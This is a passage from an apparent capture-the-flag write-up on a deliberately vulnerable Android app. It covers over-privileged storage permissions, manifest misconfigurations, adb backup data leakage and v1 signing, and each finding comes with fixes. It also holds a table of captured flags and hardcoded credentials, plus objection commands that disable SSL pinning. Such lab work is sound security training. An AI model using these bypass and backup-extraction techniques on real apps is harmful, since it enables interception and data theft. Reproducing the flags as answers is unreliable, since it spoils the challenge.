**Answer:** **E — Both B and C** (`READ_EXTERNAL_STORAGE` + `WRITE_EXTERNAL_STORAGE`).

### Step 1 — Dump every permission the app requests
```bash
grep -oE 'android.permission\.[A-Z_]+' cmp_decompiled/AndroidManifest.xml | sort -u
```
```
android.permission.INTERNET
android.permission.READ_EXTERNAL_STORAGE
android.permission.WRITE_EXTERNAL_STORAGE
```

### Step 2 — Check whether those permissions are actually used
```bash
grep -riE "Environment\.getExternal|getExternalStorage|/sdcard|FileOutputStream" \
  cmp_decompiled/smali/org/android/cmpen/   # → NO storage-related code at all
```

### Analysis of each permission
| Permission | Type | Actually used? | Verdict |
|------------|------|----------------|---------|
| `INTERNET` | normal | Yes — every API call needs it | **OK** |
| `READ_EXTERNAL_STORAGE` | **dangerous** (runtime) | No | **Insecure / over-privileged** |
| `WRITE_EXTERNAL_STORAGE` | **dangerous** (runtime) | No | **Insecure / over-privileged** |

The app reads/writes **nothing** on external storage, yet asks for full external-storage
read/write. That's a classic **over-privileged app** — unnecessary dangerous permissions
expand the attack surface (a malicious app/query interacting with your files) and fail
the principle of least privilege.

### How to FIX it
- Strip every permission the app doesn't use.
- Prefer scoped APIs (MediaStore / SAF) over broad storage permissions if storage is needed.
- Follow **least privilege**: request only what a feature actually requires.

### FINAL ANSWER — Challenge 11

```
E. Both B and C — READ_EXTERNAL_STORAGE + WRITE_EXTERNAL_STORAGE
(unused, dangerous, over-privileged; INTERNET is legitimately used)
```

---

# CHALLENGE 12 — Manifest Security Misconfigurations

### The question
> "Identify the security misconfigurations defined in AndroidManifest.xml:
> A. Application allows cleartext traffic
> B. Debug enabled for application
> C. Application data can be backed up
> D. Only A and B
> E. All: A, B and C"

**Answer:** **E — All three.**

### Step 1 — Read the `<application>` tag
```bash
grep -oE '<application[^>]*>' cmp_decompiled/AndroidManifest.xml
```
Three guilty attributes in one line:
```
android:usesCleartextTraffic="true"      ← cleartext traffic ALLOWED  (A)
android:debuggable="true"                ← debug mode ENABLED        (B)
android:allowBackup="true"               ← backup ALLOWED            (C)
```

### Step 2 — Check the network security config too
```bash
cat cmp_decompiled/res/xml/network_security_config.xml
```
Even the per-domain config re-allows cleartext (`cleartextTrafficPermitted="true"` for
`ninja.secops.group`) — double confirmation of A.

### What each misconfiguration means
| Flag | Value | Impact |
|------|-------|--------|
| A. `usesCleartextTraffic="true"` | true | App may send sensitive data as **plain HTTP** (sniffable, MITM-able) |
| B. `debuggable="true"` | true | Attacker can **attach a debugger**, dump memory/keys, patch checks |
| C. `allowBackup="true"` | true | Anyone with `adb backup` can **exfiltrate app data** (tokens, keys, creds) |
| D | — | Not enough — C also present |
| E | all present | **Correct** |

### How to FIX it
- `android:usesCleartextTraffic="false"` + keep strict `network_security_config` (HTTPS only).
- `android:debuggable="false"` for release builds.
- `android:allowBackup="false"` (or a restrictive `fullBackupContent`/`dataExtractionRules`).

### FINAL ANSWER — Challenge 12

```
E. All: A (cleartext allowed), B (debuggable), C (backup allowed)
  - usesCleartextTraffic="true"                   (manifest + network_security_config)
  - android:debuggable="true"
  - android:allowBackup="true"
```

---

# CHALLENGE 13 — Backup Misconfiguration → Sensitive `.ab` Backup Files

### The question
> "Which misconfiguration in AndroidManifest.xml may allow files with `.ab`
> extension to contain sensitive data?"
> Options: `android:exported=true` / `android.permission.WRITE_EXTERNAL_STORAGE` /
> `android:debuggable=true` / **`android:allowBackup=true`**

**Answer:** **`android:allowBackup="true"`** (which this app has).

### What is an `.ab` file?
`.ab` = **Android Backup archive**. Running:
```bash
adb backup -f backup.ab org.android.cmpen
```
creates `backup.ab` — the app's entire private data (SharedPreferences, databases,
files → tokens, keys, credentials). Tools like `abe` (Android Backup Extractor) unpack it.

### Why `allowBackup=true` is the misconfiguration
| Option | Produces `.ab` files? | Why |
|--------|------------------------|-----|
| `android:exported="true"` | No | Component exposure, not backup |
| `WRITE_EXTERNAL_STORAGE` | No | File-system permission, not backup |
| `android:debuggable="true"` | No | Debugger attachment, not backup |
| **`allowBackup="true"`** | **Yes** | Grants adb backup → `.ab` archive of app data |

With `android:allowBackup="true"` (confirmed in `AndroidManifest.xml`), an attacker with
adb access (or a malicious tool on a rooted device) can back up and exfiltrate every
secret the app stores.

### How to FIX it
- `android:allowBackup="false"`, or restrict via `fullBackupContent` / `dataExtractionRules`
  to only non-sensitive files.

### FINAL ANSWER — Challenge 13

```
android:allowBackup="true"   →   adb backup creates .ab files that can leak sensitive app data
```

---

# CHALLENGE 14 — Obsolete Signature Scheme (target SDK 33)

### The question
> "Examine the app's signature scheme in the context of the targeted SDK version and select
> the obsolete signature scheme:
> A. Signature scheme v1
> B. Signature scheme v2
> C. v1 and v2
> D. None of the above"

**Answer:** **A. Signature scheme v1.**

### Background — the three signature schemes
| Scheme | Since | Purpose | Status |
|--------|-------|---------|--------|
| **v1 (JAR signing)** | Original Android | ZIP-level `META-INF/*.RSA` signatures | **Obsolete** for modern targets |
| **v2 (APK Signature Scheme)** | Android 7.0 (API 24) | Whole-file signature in APK Signing Block | Standard now |
| **v3/v3.1** | Android 9 (API 28) | Adds key rotation | Current |

### The "context of target SDK" part
- `apktool.yml` shows `targetSdkVersion: '33'` (Android 13).
- For apps **targeting Android 11+ (API 30+)**, the **v1 scheme is disabled**; only v2/v3 run.
- v1's weaknesses: it signs individual ZIP entries, so an attacker can strip/replace
  unsigned files (`META-INF` cover-ups, "Janus" style downgrade/ambiguity attacks) and it
  gives no whole-file integrity. That's why Android itself turns it off for modern targets.

### Evidence in this APK
```bash
unzip -l CMPen.apk | grep -iE "META-INF/.*\.(RSA|DSA|SF)"
#  META-INF/CERT.RSA   CERT.SF   MANIFEST.MF   ← classic v1 (JAR) signature
```
Combined with `targetSdkVersion: 33`, the v1 scheme is the **obsolete** one here.

### How to FIX it
- Sign with **v2 + v3** (minSdk ≥ 24 requires v2; ≥ 28 can add v3), enable `v1SigningEnabled false` for target ≥ 30, and migrate to **APK Signature Scheme v4 / Play App Signing** where possible.

### FINAL ANSWER — Challenge 14

```
A. Signature scheme v1
(targetSdk 33 ⇒ v1 disabled/obsolete; v2/v3 are the current schemes)
```

---

# Summary of All Flags

| Challenge | Topic | Flag |
|-----------|-------|------|
| 1 | Root detection | (multiple choice) — **C**, bypassable |
| 2 | SSL pinning / insecure activity | `flag{Gnv56DHQFWM6Y4mCIoUHVyQe6nwfbJIP}` |
| 3 | Auth bypass / logical flaw | `flag{RjQDd5go62bO6tJr96Nhfo0aKkmqhgDj}` |
| 4 | Insecure logging → admin login | `flag{4bXWPU6qo7bzy5sexVpgDgJcDVlgC8ak}` |
| 5 | Insecure activity (exported `FlagActivity`) | `flag{Gnv56DHQFWM6Y4mCIoUHVyQe6nwfbJIP}` |
| 6 | Firebase DB misconfiguration (public read) | `flag{P61ixgYZER1UfnZGH66v8mvzB1KqZvKR}` |
| 7 | Hardcoded secrets in source | key `MyS3cReT`, creds `d3v:Pa55w0Rd1!`, header `RaND0mFl4g-...` |
| 8 | Outdated security library | **OkHttp 3.14.9** (EOL, CVE-2021-0341 family) — `internal/Version.smali` |
| 9 | App signing method | **c. debug certificate** — `CN = Android Debug, O = Android, C = US` |
| 10 | Debugging mechanism | **d. debuggable=true + no anti-debugging features** (`android:debuggable="true"`) |
| 11 | Insecure permissions | **e. READ_EXTERNAL_STORAGE + WRITE_EXTERNAL_STORAGE** (requested but unused, over-privileged) |
| 12 | Manifest security misconfigs | **e. All** — cleartext allowed + debuggable + backup allowed |
| 13 | Backup misconfig → `.ab` | **`android:allowBackup="true"`** allows `adb backup` (`.ab`) to leak app data |
| 14 | Signature scheme (target 33) | **a. Signature scheme v1** — obsolete (v2/v3 current) |

Bonus/unused flags seen along the way:
- `flag{TCuSiKAC3ihXegd1yAELZv2blc93FhDs}` — from `GET /server_status`

---

# Glossary (noob → expert)

| Term | Plain English |
|------|---------------|
| **APK** | Android's installable app file (a ZIP with compiled code) |
| **smali** | Human-readable version of the app's bytecode produced by apktool |
| **decompile / reverse engineer** | Turning an app's code back into readable form to understand it |
| **rooting** | Giving yourself admin privileges on an Android device |
| **su** | "superuser" — the binary that grants root privileges |
| **root detection** | App checking if the device is rooted |
| **TLS / SSL** | Encryption layer for HTTPS traffic |
| **certificate pinning** | App accepting ONLY specific certificates, to prevent MITM |
| **MITM** | Man-in-the-middle: attacker places a fake cert between app and server |
| **Frida** | Dynamic instrumentation tool that lets you hook/inject into running apps |
| **objection** | Tool built on Frida for quick bypasses (e.g. `sslpinning disable`) |
| **OkHttp / Retrofit** | Popular Android networking libraries |
| **endpoint** | A specific URL+method an API exposes (e.g. `GET /auth-bypass`) |
| **authorization** | Server deciding if a request is allowed |
| **BFLA** | Broken Function Level Authorization — sensitive function callable by anyone |
| **Logcat** | Android's system log |
| **DES / AES** | Encryption algorithms (DES is old/weak, AES is modern) |
| **base64** | Encoding to represent binary data as text |
| **ECB mode** | A block cipher mode (insecure; identical plaintext blocks → identical ciphertext) |
| **PKCS5 padding** | Scheme that pads data to the block size before encryption |

---

# Things You Can Practice / Do Next

1. Try `GET /super-secret-endpoint` — it returned empty. The app has `decryptData()`.
   Maybe it returns DES-encrypted data for a *different* key.
2. Check the Firebase URL seen in resources: `https://ninja-secops-default-rtdb.firebaseio.com`
3. Practice dynamic analysis: install the app on a rooted emulator, hook
   `isDeviceRooted()` with Frida to return `false`.
4. Practice the same SSL-pinning bypass with Frida/objection instead of curl:
   ```bash
   objection -g com.org.cmpen explore
   android sslpinning disable
   ```
